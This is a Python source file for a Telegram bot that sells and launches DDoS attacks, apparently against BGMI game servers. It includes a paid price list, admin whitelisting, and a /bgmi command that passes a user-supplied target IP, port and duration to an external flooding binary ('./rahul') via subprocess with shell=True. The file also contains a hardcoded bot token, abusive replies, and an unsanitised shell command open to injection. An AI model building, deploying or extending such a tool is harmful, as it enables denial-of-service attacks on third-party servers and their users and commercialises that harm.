#soulddoserpython

import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7740649057:AAEa48jPk3g94FiMZ1tufUb3UihS6loLZi8')

# Admin user IDs
admin_id = {"6366780616", "7148316298", "12345667"}
USER_FILE = "users1.txt"
LOG_FILE = "log1.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

def log_command(user_id, king, TRUSTPAPA, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nking: {king}\nTRUSTPAPA: {TRUSTPAPA}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

def record_command_logs(user_id, command, king=None, TRUSTPAPA=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if king:
        log_entry += f" | king: {king}"
    if TRUSTPAPA:
        log_entry += f" | TRUSTPAPA: {TRUSTPAPA}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣"

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣"

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "😎🇲 🇪  🇰 🇷  🇩 🇺 🇳 🇬 🇦  🇹 🇺 🇲  🇧 🇸  🇰 🇭 🇪 🇱 😎"
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @TRUSTVIP_MOD ❄"
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣"
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

def start_attack_reply(message, king, TRUSTPAPA, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {king}\n𝐏𝐨𝐫𝐭: {TRUSTPAPA}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: soul\n\n🌟 DDOS LAGADO OFFICIAL..!💀"
    bot.reply_to(message, response)

soul_cooldown = {}

COOLDOWN_TIME =0

@bot.message_handler(commands=['bgmi'])
def handle_soul(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            
            if user_id in soul_cooldown and (datetime.datetime.now() - soul_cooldown[user_id]).seconds < 3:
                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            soul_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  
            king = command[1]
            TRUSTPAPA = int(command[2])  
            time = int(command[3])  
            if time > 181:
                response = " अरे क्यों माँ चुदा रहा है जब 180 से ज्यादा का अटैक नही लगता है LAST:- 180 ."
            else:
                record_command_logs(user_id, '/soul_compiled', king, TRUSTPAPA, time)
                log_command(user_id, king, TRUSTPAPA, time)
                start_attack_reply(message, king, TRUSTPAPA, time)  
                full_command = f"./rahul {king} {TRUSTPAPA} {time} 877"
                subprocess.run(full_command, shell=True)
                response = f" 🇮🇳🇦 🇹 🇹 🇦 🇨 🇰  🇴 🇫 🇫  🇮🇳 "
        else:
            response = "✅𝗧𝗥𝗬 𝗧𝗛𝗜𝗦✅ :- /bgmi <king> <TRUSTPAPA> <time>"  
    else:
        response = " ⚠️ 𝗖𝗛𝗟 𝗕𝗢𝗢𝗦𝗗𝗜𝗞𝗘 𝗙𝗜𝗥𝗦𝗧 𝗨𝗦𝗘 𝗖𝗢𝗡𝗗𝗢𝗠  𝗕𝗨𝗬 @TRUSTVIP_MOD."

    bot.reply_to(message, response)



@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣"

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
🚬 /bgmi : Method For TRUST FREEZ SERVER. 
🚬 /rules : Please Check Before Use !!.
🚬 /mylogs : To Check Your Recents Attacks.
🚬 /prize : Checkout Our Botnet Rates.

🚬 To See Admin Commands:
🚬 /admincmd : Shows All Admin Commands.

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''ıllıllı 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙃𝙄𝙂𝙃 𝙋𝙊𝙒𝙀𝙍 𝘿𝙊𝙊𝙎 𝙊𝙁 𝙏𝙍𝙐𝙎𝙏 ıllıllı \n {user_name}! \n
🦚𝙏𝙍𝙔 𝙏𝙃𝙄𝙎 𝘾𝙊𝙊𝙈𝙈𝘼𝙉𝘿: /help 
🥶𝘽𝙐𝙔 :- @TRUSTVIP_MOD 
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. 𝙳𝙾𝙽𝚃 𝚁𝚄𝙽 𝙼𝙰𝙽𝚈 𝙰𝚃𝚃𝙲𝙲𝙺𝚂

2. 𝙳𝙾𝙽𝚃 𝚁𝚄𝙽 𝙼𝙰𝙽𝚈 𝙰𝚃𝙲𝙺 𝙰𝚃 𝚂𝙰𝙼𝙴 𝚃𝙸𝙼𝙴 𝙾𝚃𝙷𝙴𝚁𝚆𝙸𝚂𝙴 𝚈𝙾𝚄 𝚆𝙴𝚁𝙴 𝙱𝙰𝙽𝙽𝙴𝙳 𝚃𝙷𝙸𝚂 𝙱𝙾𝚃

3. ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
क्यो पड़े हो चक्कर मे कोई नही है टक्कर मे 

4. BUY OWN BOT & ACCES ANYONE 
DM @TRUSTVIP_MOD         


5.  𝖢𝖧𝖤𝖢𝖪 𝖸𝖮𝖴 𝖩𝖮𝖨𝖭 𝖮𝖳𝖧𝖤𝖱𝖶𝖨𝖲𝖤 𝖡𝖮𝖳 𝖭𝖮𝖳 𝖶𝖱𝖮𝖪𝖨𝖭𝖦
https://t.me/+hq3nOt7TloNjYzhl !!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['prize'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 🖤 𝐏𝐫𝐢𝐜𝐞 𝐋𝐢𝐬𝐭 :

 𝙋𝙊𝙒𝙀𝙍𝙁𝙐𝙇𝙇 𝘿𝘿𝙊𝙎

⭕️ 

⭕️ 24/7 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏

♨️ 𝘿𝘼𝙔 190𝙧𝙨

♨️ 𝙒𝙀𝙀𝙆 600

♨️ 𝙈𝙊𝙉𝙏𝙃 700

♨️ 𝙁𝙐𝙇𝙇 𝙎𝙀𝙎𝙊𝙉 900

♨️ 𝙊𝙒𝙉 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏 2𝙆

DM :- @TRUSTVIP_MOD
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

🖤 /add <userId> : Add a User.
🖤 /remove <userid> Remove a User.
🖤 /allusers : Authorised Users Lists.
🖤 /logs : All Users Logs.
🖤 /broadcast : Broadcast a Message.
🖤 /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "ᵀᵁᴹˢᴱ ᴺᴬ ᴴᴼ ᴾᴬʸᴱᴳᴬ🤣"

    bot.reply_to(message, response)




while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
